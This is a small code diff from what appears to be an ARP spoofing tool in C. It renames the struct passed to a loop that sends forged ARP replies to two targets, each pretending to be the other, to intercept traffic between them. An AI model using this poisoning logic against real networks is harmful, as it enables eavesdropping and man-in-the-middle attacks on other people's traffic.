@@ -5,14 +5,14 @@
     void *
 arp_poison(void *arg_ptr) 
 {
-    struct poison_pass *pass_poison = (struct poison_pass *)arg_ptr;
+    struct data_pass *data_pass = (struct data_pass *)arg_ptr;
 
     while(1) 
     {
         //send a fake arp-reply to target 1 pretending to be target 2
-        arp_reply(pass_poison->ip2, pass_poison->ip1, pass_poison->mac1, pass_poison->l);
+        arp_reply(data_pass->ip2, data_pass->ip1, data_pass->mac1, data_pass->l);
         //send a fake arp-reply to target 2 pretending to be target 1
-        arp_reply(pass_poison->ip1, pass_poison->ip2, pass_poison->mac2, pass_poison->l);
+        arp_reply(data_pass->ip1, data_pass->ip2, data_pass->mac2, data_pass->l);
         sleep(1);
     }
 }
